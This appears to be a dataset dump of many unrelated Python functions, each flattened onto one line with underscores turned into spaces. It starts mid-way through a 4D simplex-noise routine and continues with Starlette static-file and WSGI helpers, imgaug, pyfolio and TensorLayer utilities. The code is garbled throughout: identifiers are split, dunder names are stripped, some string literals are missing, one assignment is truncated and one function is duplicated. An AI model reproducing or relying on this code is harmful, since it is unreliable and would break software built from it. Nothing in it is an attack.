p1 b po = 0x0E b is bigger side = False elif a score > b score and p1 < a score : a score = p1 a po = 0x0E a is bigger side = False # Decide if (1,0,1,1) is closer. p2 = 3 - in sum + yins if a score <= b score and p2 < b score : b score = p2 b po = 0x0D b is bigger side = False elif a score > b score and p2 < a score : a score = p2 a po = 0x0D a is bigger side = False # Decide if (1,1,0,1) is closer. p3 = 3 - in sum + zins if a score <= b score and p3 < b score : b score = p3 b po = 0x0B b is bigger side = False elif a score > b score and p3 < a score : a score = p3 a po = 0x0B a is bigger side = False # Decide if (1,1,1,0) is closer. p4 = 3 - in sum + wins if a score <= b score and p4 < b score : b po = 0x07 b is bigger side = False elif a score > b score and p4 < a score : a po = 0x07 a is bigger side = False # Where each of the two closest pos are determines how the extra three vertices are calculated. if a is bigger side == b is bigger side : if a is bigger side : # Both closest pos on the bigger side c1 = ( a po & b po ) c2 = ( a po | b po ) # Two contributions are  permutations of (0,0,0,1) and (0,0,0,2) based on c1 xsv ext0 = xsv ext1 = xsb ysv ext0 = ysv ext1 = ysb zsv ext0 = zsv ext1 = zsb wsv ext0 = wsv ext1 = wsb dx ext0 = dx0 - SQUISH CONSTANT 4D dy ext0 = dy0 - SQUISH CONSTANT 4D dz ext0 = dz0 - SQUISH CONSTANT 4D dw ext0 = dw0 - SQUISH CONSTANT 4D dx ext1 = dx0 - 2 * SQUISH CONSTANT 4D dy ext1 = dy0 - 2 * SQUISH CONSTANT 4D dz ext1 = dz0 - 2 * SQUISH CONSTANT 4D dw ext1 = dw0 - 2 * SQUISH CONSTANT 4D if ( c1 & 0x01 ) != 0 : xsv ext0 += 1 dx ext0 -= 1 xsv ext1 += 2 dx ext1 -= 2 elif ( c1 & 0x02 ) != 0 : ysv ext0 += 1 dy ext0 -= 1 ysv ext1 += 2 dy ext1 -= 2 elif ( c1 & 0x04 ) != 0 : zsv ext0 += 1 dz ext0 -= 1 zsv ext1 += 2 dz ext1 -= 2 else : wsv ext0 += 1 dw ext0 -= 1 wsv ext1 += 2 dw ext1 -= 2 # One contribution is a  permutation of (1,1,1,-1) based on c2 xsv ext2 = xsb + 1 ysv ext2 = ysb + 1 zsv ext2 = zsb + 1 wsv ext2 = wsb + 1 dx ext2 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy ext2 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz ext2 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw ext2 = dw0 - 1 - 2 * SQUISH CONSTANT 4D if ( c2 & 0x01 ) == 0 : xsv ext2 -= 2 dx ext2 += 2 elif ( c2 & 0x02 ) == 0 : ysv ext2 -= 2 dy ext2 += 2 elif ( c2 & 0x04 ) == 0 : zsv ext2 -= 2 dz ext2 += 2 else : wsv ext2 -= 2 dw ext2 += 2 else : # Both closest pos on the smaller side # One of the two extra pos is (1,1,1,1) xsv ext2 = xsb + 1 ysv ext2 = ysb + 1 zsv ext2 = zsb + 1 wsv ext2 = wsb + 1 dx ext2 = dx0 - 1 - 4 * SQUISH CONSTANT 4D dy ext2 = dy0 - 1 - 4 * SQUISH CONSTANT 4D dz ext2 = dz0 - 1 - 4 * SQUISH CONSTANT 4D dw ext2 = dw0 - 1 - 4 * SQUISH CONSTANT 4D # Other two pos are based on the shared axes. c = ( a po & b po ) if ( c & 0x01 ) != 0 : xsv ext0 = xsb + 2 xsv ext1 = xsb + 1 dx ext0 = dx0 - 2 - 3 * SQUISH CONSTANT 4D dx ext1 = dx0 - 1 - 3 * SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsb dx ext0 = dx ext1 = dx0 - 3 * SQUISH CONSTANT 4D if ( c & 0x02 ) != 0 : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy ext1 = dy0 - 1 - 3 * SQUISH CONSTANT 4D if ( c & 0x01 ) == 0 : ysv ext0 += 1 dy ext0 -= 1 else : ysv ext1 += 1 dy ext1 -= 1 else : ysv ext0 = ysv ext1 = ysb dy ext0 = dy ext1 = dy0 - 3 * SQUISH CONSTANT 4D if ( c & 0x04 ) != 0 : zsv ext0 = zsv ext1 = zsb + 1 dz ext0 = dz ext1 = dz0 - 1 - 3 * SQUISH CONSTANT 4D if ( c & 0x03 ) == 0 : zsv ext0 += 1 dz ext0 -= 1 else : zsv ext1 += 1 dz ext1 -= 1 else : zsv ext0 = zsv ext1 = zsb dz ext0 = dz ext1 = dz0 - 3 * SQUISH CONSTANT 4D if ( c & 0x08 ) != 0 : wsv ext0 = wsb + 1 wsv ext1 = wsb + 2 dw ext0 = dw0 - 1 - 3 * SQUISH CONSTANT 4D dw ext1 = dw0 - 2 - 3 * SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsb dw ext0 = dw ext1 = dw0 - 3 * SQUISH CONSTANT 4D else : # One po on each "side" if a is bigger side : c1 = a po c2 = b po else : c1 = b po c2 = a po # Two contributions are the bigger-sided po with each 1 replaced with 2. if ( c1 & 0x01 ) != 0 : xsv ext0 = xsb + 2 xsv ext1 = xsb + 1 dx ext0 = dx0 - 2 - 3 * SQUISH CONSTANT 4D dx ext1 = dx0 - 1 - 3 * SQUISH CONSTANT 4D else : xsv ext0 = xsv ext1 = xsb dx ext0 = dx ext1 = dx0 - 3 * SQUISH CONSTANT 4D if ( c1 & 0x02 ) != 0 : ysv ext0 = ysv ext1 = ysb + 1 dy ext0 = dy ext1 = dy0 - 1 - 3 * SQUISH CONSTANT 4D if ( c1 & 0x01 ) == 0 : ysv ext0 += 1 dy ext0 -= 1 else : ysv ext1 += 1 dy ext1 -= 1 else : ysv ext0 = ysv ext1 = ysb dy ext0 = dy ext1 = dy0 - 3 * SQUISH CONSTANT 4D if ( c1 & 0x04 ) != 0 : zsv ext0 = zsv ext1 = zsb + 1 dz ext0 = dz ext1 = dz0 - 1 - 3 * SQUISH CONSTANT 4D if ( c1 & 0x03 ) == 0 : zsv ext0 += 1 dz ext0 -= 1 else : zsv ext1 += 1 dz ext1 -= 1 else : zsv ext0 = zsv ext1 = zsb dz ext0 = dz ext1 = dz0 - 3 * SQUISH CONSTANT 4D if ( c1 & 0x08 ) != 0 : wsv ext0 = wsb + 1 wsv ext1 = wsb + 2 dw ext0 = dw0 - 1 - 3 * SQUISH CONSTANT 4D dw ext1 = dw0 - 2 - 3 * SQUISH CONSTANT 4D else : wsv ext0 = wsv ext1 = wsb dw ext0 = dw ext1 = dw0 - 3 * SQUISH CONSTANT 4D # One contribution is a  permutation of (1,1,1,-1) based on the smaller-sided po xsv ext2 = xsb + 1 ysv ext2 = ysb + 1 zsv ext2 = zsb + 1 wsv ext2 = wsb + 1 dx ext2 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy ext2 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz ext2 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw ext2 = dw0 - 1 - 2 * SQUISH CONSTANT 4D if ( c2 & 0x01 ) == 0 : xsv ext2 -= 2 dx ext2 += 2 elif ( c2 & 0x02 ) == 0 : ysv ext2 -= 2 dy ext2 += 2 elif ( c2 & 0x04 ) == 0 : zsv ext2 -= 2 dz ext2 += 2 else : wsv ext2 -= 2 dw ext2 += 2 # Contribution (1,1,1,0) dx4 = dx0 - 1 - 3 * SQUISH CONSTANT 4D dy4 = dy0 - 1 - 3 * SQUISH CONSTANT 4D dz4 = dz0 - 1 - 3 * SQUISH CONSTANT 4D dw4 = dw0 - 3 * SQUISH CONSTANT 4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , wsb + 0 , dx4 , dy4 , dz4 , dw4 ) # Contribution (1,1,0,1) dx3 = dx4 dy3 = dy4 dz3 = dz0 - 3 * SQUISH CONSTANT 4D dw3 = dw0 - 1 - 3 * SQUISH CONSTANT 4D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 1 , dx3 , dy3 , dz3 , dw3 ) # Contribution (1,0,1,1) dx2 = dx4 dy2 = dy0 - 3 * SQUISH CONSTANT 4D dz2 = dz4 dw2 = dw3 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 1 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,1,1,1) dx1 = dx0 - 3 * SQUISH CONSTANT 4D dz1 = dz4 dy1 = dy4 dw1 = dw3 attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 1 , dx1 , dy1 , dz1 , dw1 ) # Contribution (1,1,0,0) dx5 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy5 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz5 = dz0 - 0 - 2 * SQUISH CONSTANT 4D dw5 = dw0 - 0 - 2 * SQUISH CONSTANT 4D attn5 = 2 - dx5 * dx5 - dy5 * dy5 - dz5 * dz5 - dw5 * dw5 if attn5 > 0 : attn5 *= attn5 value += attn5 * attn5 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 0 , dx5 , dy5 , dz5 , dw5 ) # Contribution (1,0,1,0) dx6 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy6 = dy0 - 0 - 2 * SQUISH CONSTANT 4D dz6 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw6 = dw0 - 0 - 2 * SQUISH CONSTANT 4D attn6 = 2 - dx6 * dx6 - dy6 * dy6 - dz6 * dz6 - dw6 * dw6 if attn6 > 0 : attn6 *= attn6 value += attn6 * attn6 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 0 , dx6 , dy6 , dz6 , dw6 ) # Contribution (1,0,0,1) dx7 = dx0 - 1 - 2 * SQUISH CONSTANT 4D dy7 = dy0 - 0 - 2 * SQUISH CONSTANT 4D dz7 = dz0 - 0 - 2 * SQUISH CONSTANT 4D dw7 = dw0 - 1 - 2 * SQUISH CONSTANT 4D attn7 = 2 - dx7 * dx7 - dy7 * dy7 - dz7 * dz7 - dw7 * dw7 if attn7 > 0 : attn7 *= attn7 value += attn7 * attn7 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 1 , dx7 , dy7 , dz7 , dw7 ) # Contribution (0,1,1,0) dx8 = dx0 - 0 - 2 * SQUISH CONSTANT 4D dy8 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz8 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw8 = dw0 - 0 - 2 * SQUISH CONSTANT 4D attn8 = 2 - dx8 * dx8 - dy8 * dy8 - dz8 * dz8 - dw8 * dw8 if attn8 > 0 : attn8 *= attn8 value += attn8 * attn8 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 0 , dx8 , dy8 , dz8 , dw8 ) # Contribution (0,1,0,1) dx9 = dx0 - 0 - 2 * SQUISH CONSTANT 4D dy9 = dy0 - 1 - 2 * SQUISH CONSTANT 4D dz9 = dz0 - 0 - 2 * SQUISH CONSTANT 4D dw9 = dw0 - 1 - 2 * SQUISH CONSTANT 4D attn9 = 2 - dx9 * dx9 - dy9 * dy9 - dz9 * dz9 - dw9 * dw9 if attn9 > 0 : attn9 *= attn9 value += attn9 * attn9 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 1 , dx9 , dy9 , dz9 , dw9 ) # Contribution (0,0,1,1) dx10 = dx0 - 0 - 2 * SQUISH CONSTANT 4D dy10 = dy0 - 0 - 2 * SQUISH CONSTANT 4D dz10 = dz0 - 1 - 2 * SQUISH CONSTANT 4D dw10 = dw0 - 1 - 2 * SQUISH CONSTANT 4D attn10 = 2 - dx10 * dx10 - dy10 * dy10 - dz10 * dz10 - dw10 * dw10 if attn10 > 0 : attn10 *= attn10 value += attn10 * attn10 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 1 , dx10 , dy10 , dz10 , dw10 ) # First extra vertex attn ext0 = 2 - dx ext0 * dx ext0 - dy ext0 * dy ext0 - dz ext0 * dz ext0 - dw ext0 * dw ext0 if attn ext0 > 0 : attn ext0 *= attn ext0 value += attn ext0 * attn ext0 * extrapolate ( xsv ext0 , ysv ext0 , zsv ext0 , wsv ext0 , dx ext0 , dy ext0 , dz ext0 , dw ext0 ) # Second extra vertex attn ext1 = 2 - dx ext1 * dx ext1 - dy ext1 * dy ext1 - dz ext1 * dz ext1 - dw ext1 * dw ext1 if attn ext1 > 0 : attn ext1 *= attn ext1 value += attn ext1 * attn ext1 * extrapolate ( xsv ext1 , ysv ext1 , zsv ext1 , wsv ext1 , dx ext1 , dy ext1 , dz ext1 , dw ext1 ) # Third extra vertex attn ext2 = 2 - dx ext2 * dx ext2 - dy ext2 * dy ext2 - dz ext2 * dz ext2 - dw ext2 * dw ext2 if attn ext2 > 0 : attn ext2 *= attn ext2 value += attn ext2 * attn ext2 * extrapolate ( xsv ext2 , ysv ext2 , zsv ext2 , wsv ext2 , dx ext2 , dy ext2 , dz ext2 , dw ext2 ) return value / NORM CONSTANT 4D
def In Colorspace ( to colorspace , from colorspace = "RGB" , children = None , name = None , deterministic = False , random state = None ) : return With Colorspace ( to colorspace , from colorspace , children , name , deterministic , random state )
def height ( self ) : if len ( self . coords ) <= 1 : return 0 return np . max ( self . yy ) - np . min ( self . yy )
def width ( self ) : if len ( self . coords ) <= 1 : return 0 return np . max ( self . xx ) - np . min ( self . xx )
def offer ( self , p , e : Event ) : existing = self . events scan . setdefault ( p , ( [ ] , [ ] , [ ] , [ ] ) if USE VERTICAL else ( [ ] , [ ] , [ ] ) ) # Can use double linked-list for easy insertion at beginning/end existing [ e . type ] . append ( e )
def append ( self , key : str , value : str ) -> None : append key = key . lower ( ) . encode ( "latin-1" ) append value = value . encode ( "latin-1" ) self . list . append ( ( append key , append value ) )
def parse docstring ( self , func or method : typing . Callable ) -> dict : docstring = func or method . doc if not docstring : return { } # We support having regular docstrings before the schema # definition. Here we return just the schema part from # the docstring. docstring = docstring . split ( "---" ) [ - 1 ] parsed = yaml . safe load ( docstring ) if not isinstance ( parsed , dict ) : # A regular docstring (not yaml formatted) can return # a simple string here, which wouldn't follow the schema. return { } return parsed
async def get response ( self , path : str , scope : Scope ) -> Response : if scope [ "method" ] not in ( "GET" , "HEAD" ) : return Plain Text Response ( "Method Not Allowed" , status code = 405 ) if path . startswith ( ".." ) : # Most clients will normalize the path, so we shouldn't normally # get this, but don't allow misbehaving clients to break out of # the static files directory. return Plain Text Response ( "Not Found" , status code = 404 ) full path , stat result = await self . lookup path ( path ) if stat result and stat . S ISREG ( stat result . st mode ) : # We have a static file to serve. return self . file response ( full path , stat result , scope ) elif stat result and stat . S ISDIR ( stat result . st mode ) and self . html : # We're in HTML mode, and have got a directory URL. # Check if we have 'index.html' file to serve. index path = os . path . join ( path , "index.html" ) full path , stat result = await self . lookup path ( index path ) if stat result is not None and stat . S ISREG ( stat result . st mode ) : if not scope [ "path" ] . endswith ( "/" ) : # Directory UR Ls should redirect to always end in "/". url = URL ( scope = scope ) url = url . replace ( path = url . path + "/" ) return Redirect Response ( url = url ) return self . file response ( full path , stat result , scope ) if self . html : # Check for '404.html' if we're in HTML mode. full path , stat result = await self . lookup path ( "404.html" ) if stat result is not None and stat . S ISREG ( stat result . st mode ) : return self . file response ( full path , stat result , scope , status code = 404 ) return Plain Text Response ( "Not Found" , status code = 404 )
def build environ ( scope : Scope , body : bytes ) -> dict : environ = { "REQUEST METHOD" : scope [ "method" ] , "SCRIPT NAME" : scope . get ( "root path" , "" ) , "PATH INFO" : scope [ "path" ] , "QUERY STRING" : scope [ "query string" ] . decode ( "ascii" ) , "SERVER PROTOCOL" : f"HTTP/{scope['http version']}" , "wsgi.version" : ( 1 , 0 ) , "wsgi.url scheme" : scope . get ( "scheme" , "http" ) , "wsgi.input" : io . Bytes IO ( body ) , "wsgi.errors" : sys . stdout , "wsgi.multithread" : True , "wsgi.multiprocess" : True , "wsgi.run once" : False , } # Get server name and port - required in WSGI, not in ASGI server = scope . get ( "server" ) or ( "localhost" , 80 ) environ [ "SERVER NAME" ] = server [ 0 ] environ [ "SERVER PORT" ] = server [ 1 ] # Get client IP address if scope . get ( "client" ) : environ [ "REMOTE ADDR" ] = scope [ "client" ] [ 0 ] # Go through headers and make them into environ entries for name , value in scope . get ( "headers" , [ ] ) : name = name . decode ( "latin1" ) if name == "content-length" : corrected name = "CONTENT LENGTH" elif name == "content-type" : corrected name = "CONTENT TYPE" else : corrected name = f"HTTP {name}" . upper ( ) . replace ( "-" , " " ) # HTT Pbis say only ASCII chars are allowed in headers, but we latin1 just in case value = value . decode ( "latin1" ) if corrected name in environ : value = environ [ corrected name ] + "," + value environ [ corrected name ] = value return environ
async def receive ( self ) -> Message : if self . client state == Web Socket State . CONNECTING : message = await self . receive ( ) message type = message [ "type" ] assert message type == "websocket.connect" self . client state = Web Socket State . CONNECTED return message elif self . client state == Web Socket State . CONNECTED : message = await self . receive ( ) message type = message [ "type" ] assert message type in { "websocket.receive" , "websocket.disconnect" } if message type == "websocket.disconnect" : self . client state = Web Socket State . DISCONNECTED return message else : raise Runtime Error ( 'Cannot call "receive" once a disconnect message has been received.' )
async def send ( self , message : Message ) -> None : if self . application state == Web Socket State . CONNECTING : message type = message [ "type" ] assert message type in { "websocket.accept" , "websocket.close" } if message type == "websocket.close" : self . application state = Web Socket State . DISCONNECTED else : self . application state = Web Socket State . CONNECTED await self . send ( message ) elif self . application state == Web Socket State . CONNECTED : message type = message [ "type" ] assert message type in { "websocket.send" , "websocket.close" } if message type == "websocket.close" : self . application state = Web Socket State . DISCONNECTED await self . send ( message ) else : raise Runtime Error ( 'Cannot call "send" once a close message has been sent.' )
def cumulative returns less costs ( returns , costs ) : if costs is None : return ep . cum returns ( returns ) return ep . cum returns ( returns - costs )
def to utc ( df ) : try : df . index = df . index . tz localize ( 'UTC' ) except Type Error : df . index = df . index . tz convert ( 'UTC' ) return df
def sample colormap ( cmap name , n samples ) : colors = [ ] colormap = cm . cmap d [ cmap name ] for i in np . linspace ( 0 , 1 , n samples ) : colors . append ( colormap ( i ) ) return colors
def customize ( func ) : @ wraps ( func ) def call w context ( * args , * * kwargs ) : set context = kwargs . pop ( 'set context' , True ) if set context : with plotting context ( ) , axes style ( ) : return func ( * args , * * kwargs ) else : return func ( * args , * * kwargs ) return call w context
def private method ( func ) : def func wrapper ( * args , * * kwargs ) : """Decorator wrapper function.""" outer frame = inspect . stack ( ) [ 1 ] [ 0 ] if 'self' not in outer frame . f locals or outer frame . f locals [ 'self' ] is not args [ 0 ] : raise Runtime Error ( '%s.%s is a private method' % ( args [ 0 ] . class . name , func . name ) ) return func ( * args , * * kwargs ) return func wrapper
def protected method ( func ) : def func wrapper ( * args , * * kwargs ) : """Decorator wrapper function.""" outer frame = inspect . stack ( ) [ 1 ] [ 0 ] caller = inspect . getmro ( outer frame . f locals [ 'self' ] . class ) [ : - 1 ] target = inspect . getmro ( args [ 0 ] . class ) [ : - 1 ] share subsclass = False for cls in target : if issubclass ( caller [ 0 ] , cls ) or caller [ 0 ] is cls : share subsclass = True break if ( 'self' not in outer frame . f locals or outer frame . f locals [ 'self' ] is not args [ 0 ] ) and ( not share subsclass ) : raise Runtime Error ( '%s.%s is a protected method' % ( args [ 0 ] . class . name , func . name ) ) return func ( * args , * * kwargs ) return func wrapper
def log if ( level , msg , condition , * args ) : if condition : vlog ( level , msg , * args )
def google2 log prefix ( level , timestamp = None , file and line = None ) : # pylint: disable=global-variable-not-assigned global level names # pylint: enable=global-variable-not-assigned # Record current time now = timestamp or time . time ( ) now tuple = time . localtime ( now ) now microsecond = int ( 1e6 * ( now % 1.0 ) ) ( filename , line ) = file and line or Get File And Line ( ) basename = os . path . basename ( filename ) # Severity string severity = 'I' if level in level names : severity = level names [ level ] [ 0 ] s = '%c%02d%02d %02d: %02d: %02d.%06d %5d %s: %d] ' % ( severity , now tuple [ 1 ] , # month now tuple [ 2 ] , # day now tuple [ 3 ] , # hour now tuple [ 4 ] , # min now tuple [ 5 ] , # sec now microsecond , get thread id ( ) , basename , line ) return s
def validation metrics ( self ) : if ( self . validation iterator is None ) or ( self . validation metrics is None ) : raise Attribute Error ( 'Validation is not setup.' ) n = 0.0 metric sums = [ 0.0 ] * len ( self . validation metrics ) self . sess . run ( self . validation iterator . initializer ) while True : try : metrics = self . sess . run ( self . validation metrics ) for i , m in enumerate ( metrics ) : metric sums [ i ] += m n += 1.0 except tf . errors . Out Of Range Error : break for i , m in enumerate ( metric sums ) : metric sums [ i ] = metric sums [ i ] / n return zip ( self . validation metrics , metric sums )
def retrieve seq length op3 ( data , pad val = 0 ) : # Hang Sheng: return tensor for sequence length, if input is tf.string data shape size = data . get shape ( ) . ndims if data shape size == 3 : return tf . reduce sum ( tf . cast ( tf . reduce any ( tf . not equal ( data , pad val ) , axis = 2 ) , dtype = tf . int32 ) , 1 ) elif data shape size == 2 : return tf . reduce sum ( tf . cast ( tf . not equal ( data , pad val ) , dtype = tf . int32 ) , 1 ) elif data shape size == 1 : raise Value Error ( "retrieve seq length op3: data has wrong shape!" ) else : raise Value Error ( "retrieve seq length op3: handling data shape size %s hasn't been implemented!" % ( data shape size ) )
def state size ( self ) : return ( LSTM State Tuple ( self . num units , self . num units ) if self . state is tuple else 2 * self . num units )
def tf repeat ( self , a , repeats ) : if len ( a . get shape ( ) ) != 1 : raise Assertion Error ( "This is not a 1D Tensor" ) a = tf . expand dims ( a , - 1 ) a = tf . tile ( a , [ 1 , repeats ] ) a = self . tf flatten ( a ) return a
def augment with ngrams ( unigrams , unigram vocab size , n buckets , n = 2 ) : def get ngrams ( n ) : return list ( zip ( * [ unigrams [ i : ] for i in range ( n ) ] ) ) def hash ngram ( ngram ) : bytes = array . array ( 'L' , ngram ) . tobytes ( ) hash = int ( hashlib . sha256 ( bytes ) . hexdigest ( ) , 16 ) return unigram vocab size + hash % n buckets return unigrams + [ hash ngram ( ngram ) for i in range ( 2 , n + 1 ) for ngram in get ngrams ( i ) ]
def load and preprocess imdb data ( n gram = None ) : X train , y train , X test , y test = tl . files . load imdb dataset ( nb words = VOCAB SIZE ) if n gram is not None : X train = np . array ( [ augment with ngrams ( x , VOCAB SIZE , N BUCKETS , n = n gram ) for x in X train ] ) X test = np . array ( [ augment with ngrams ( x , VOCAB SIZE , N BUCKETS , n = n gram ) for x in X test ] ) return X train , y train , X test , y test
def data to tfrecord ( images , labels , filename ) : if os . path . isfile ( filename ) : print ( "%s exists" % filename ) return print ( "Converting data into %s ..." % filename ) # cwd = os.getcwd() writer = tf . python io . TF Record Writer ( filename ) for index , img in enumerate ( images ) : img raw = img . tobytes ( ) # Visualize a image # tl.visualize.frame(np.asarray(img, dtype=np.uint8), second=1, saveable=False, name='frame', fig idx=1236) label = int ( labels [ index ] ) # print(label) # Convert the bytes back to image as follow: # image = Image.frombytes('RGB', (32, 32), img raw) # image = np.fromstring(img raw, np.float32) # image = image.reshape([32, 32, 3]) # tl.visualize.frame(np.asarray(image, dtype=np.uint8), second=1, saveable=False, name='frame', fig idx=1236) example = tf . train . Example ( features = tf . train . Features ( feature = { "label" : tf . train . Feature ( int64 list = tf . train . Int64List ( value = [ label ] ) ) , 'img raw' : tf . train . Feature ( bytes list = tf . train . Bytes List ( value = [ img raw ] ) ) , } ) ) writer . write ( example . Serialize To String ( ) ) # Serialize To String writer . close ( )
def read and decode ( filename , is train = None ) : filename queue = tf . train . string input producer ( [ filename ] ) reader = tf . TF Record Reader ( ) , serialized example = reader . read ( filename queue ) features = tf . parse single example ( serialized example , features = { 'label' : tf . Fixed Len Feature ( [ ] , tf . int64 ) , 'img raw' : tf . Fixed Len Feature ( [ ] , tf . string ) , } ) # You can do more image distortion here for training data img = tf . decode raw ( features [ 'img raw' ] , tf . float32 ) img = tf . reshape ( img , [ 32 , 32 , 3 ] ) # img = tf.cast(img, tf.float32) #* (1. / 255) - 0.5 if is train == True : # 1. Randomly crop a [height, width] section of the image. img = tf . random crop ( img , [ 24 , 24 , 3 ] ) # 2. Randomly flip the image horizontally. img = tf . image . random flip left right ( img ) # 3. Randomly change brightness. img = tf . image . random brightness ( img , max delta = 63 ) # 4. Randomly change contrast. img = tf . image . random contrast ( img , lower = 0.2 , upper = 1.8 ) # 5. Subtract off the mean and divide by the variance of the pixels. img = tf . image . per image standardization ( img ) elif is train == False : # 1. Crop the central [height, width] of the image. img = tf . image . resize image with crop or pad ( img , 24 , 24 ) # 2. Subtract off the mean and divide by the variance of the pixels. img = tf . image . per image standardization ( img ) elif is train == None : img = img label = tf . cast ( features [ 'label' ] , tf . int32 ) return img , label
def print params ( self , details = True , session = None ) : for i , p in enumerate ( self . all params ) : if details : try : val = p . eval ( session = session ) logging . info ( "  param {:3}: {:20} {:15}    {} (mean: {:<18}, median: {:<18}, std: {:<18})   " . format ( i , p . name , str ( val . shape ) , p . dtype . name , val . mean ( ) , np . median ( val ) , val . std ( ) ) ) except Exception as e : logging . info ( str ( e ) ) raise Exception ( "Hint: print params details after tl.layers.initialize global variables(sess) " "or use network.print params(False)." ) else : logging . info ( "  param {:3}: {:20} {:15}    {}" . format ( i , p . name , str ( p . get shape ( ) ) , p . dtype . name ) ) logging . info ( "  num of params: %d" % self . count params ( ) )
def print layers ( self ) : for i , layer in enumerate ( self . all layers ) : # logging.info("  layer %d: %s" % (i, str(layer))) logging . info ( "  layer {:3}: {:20} {:15}    {}" . format ( i , layer . name , str ( layer . get shape ( ) ) , layer . dtype . name ) )
def count params ( self ) : n params = 0 for i , p in enumerate ( self . all params ) : n = 1 # for s in p.eval().shape: for s in p . get shape ( ) : try : s = int ( s ) except Exception : s = 1 if s : n = n * s n params = n params + n return n params
def get all params ( self , session = None ) : params = [ ] for p in self . all params : if session is None : params . append ( p . eval ( ) ) else : params . append ( session . run ( p ) ) return params
def get init args ( self , skip = 4 ) : stack = inspect . stack ( ) if len ( stack ) < skip + 1 : raise Value Error ( "The length of the inspection stack is shorter than the requested start position." ) args , , , values = inspect . getargvalues ( stack [ skip ] [ 0 ] ) params = { } for arg in args : # some args dont need to be saved into the graph. e.g. the input placeholder if values [ arg ] is not None and arg not in [ 'self' , 'prev layer' , 'inputs' ] : val = values [ arg ] # change function (e.g. act) into dictionary of module path and function name if inspect . isfunction ( val ) : params [ arg ] = { "module path" : val . module , "func name" : val . name } # ignore more args e.g. TF class elif arg . endswith ( 'init' ) : continue # for other data type, save them directly else : params [ arg ] = val return params
def bias scale ( x , b , data format ) : if data format == 'NHWC' : return x * b elif data format == 'NCHW' : return x * to channel first bias ( b ) else : raise Value Error ( 'invalid data format: %s' % data format )
def bias add ( x , b , data format ) : if data format == 'NHWC' : return tf . add ( x , b ) elif data format == 'NCHW' : return tf . add ( x , to channel first bias ( b ) ) else : raise Value Error ( 'invalid data format: %s' % data format )
def batch normalization ( x , mean , variance , offset , scale , variance epsilon , data format , name = None ) : with ops . name scope ( name , 'batchnorm' , [ x , mean , variance , scale , offset ] ) : inv = math ops . rsqrt ( variance + variance epsilon ) if scale is not None : inv *= scale a = math ops . cast ( inv , x . dtype ) b = math ops . cast ( offset - mean * inv if offset is not None else - mean * inv , x . dtype ) # Return a * x + b with customized data format. # Currently TF doesn't have bias scale, and tensor RT has bug in converting tf.nn.bias add # So we reimplemted them to allow make the model work with tensor RT. df = { 'channels first' : 'NCHW' , 'channels last' : 'NHWC' } return bias add ( bias scale ( x , a , df [ data format ] ) , b , df [ data format ] )
def compute alpha ( x ) : threshold = compute threshold ( x ) alpha1 temp1 = tf . where ( tf . greater ( x , threshold ) , x , tf . zeros like ( x , tf . float32 ) ) alpha1 temp2 = tf . where ( tf . less ( x , - threshold ) , x , tf . zeros like ( x , tf . float32 ) ) alpha array = tf . add ( alpha1 temp1 , alpha1 temp2 , name = None ) alpha array abs = tf . abs ( alpha array ) alpha array abs1 = tf . where ( tf . greater ( alpha array abs , 0 ) , tf . ones like ( alpha array abs , tf . float32 ) , tf . zeros like ( alpha array abs , tf . float32 ) ) alpha sum = tf . reduce sum ( alpha array abs ) n = tf . reduce sum ( alpha array abs1 ) alpha = tf . div ( alpha sum , n ) return alpha
def ternary operation ( x ) : g = tf . get default graph ( ) with g . gradient override map ( { "Sign" : "Identity" } ) : threshold = compute threshold ( x ) x = tf . sign ( tf . add ( tf . sign ( tf . add ( x , threshold ) ) , tf . sign ( tf . add ( x , - threshold ) ) ) ) return x
def add deprecated function notice to docstring ( doc , date , instructions ) : if instructions : deprecation message = % ( ( 'in a future version' if date is None else ( 'after %s' % date ) ) , instructions ) else : deprecation message = % ( ( 'in a future version' if date is None else ( 'after %s' % date ) ) ) main text = [ deprecation message ] return add notice to docstring ( doc , 'DEPRECATED FUNCTION' , main text )
def add notice to docstring ( doc , no doc str , notice ) : if not doc : lines = [ no doc str ] else : lines = normalize docstring ( doc ) . splitlines ( ) notice = [ '' ] + notice if len ( lines ) > 1 : # Make sure that we keep our distance from the main body if lines [ 1 ] . strip ( ) : notice . append ( '' ) lines [ 1 : 1 ] = notice else : lines += notice return '\n' . join ( lines )
def word to id ( self , word ) : if word in self . vocab : return self . vocab [ word ] else : return self . unk id
def word to id ( self , word ) : if word in self . vocab : return self . vocab [ word ] else : return self . unk id
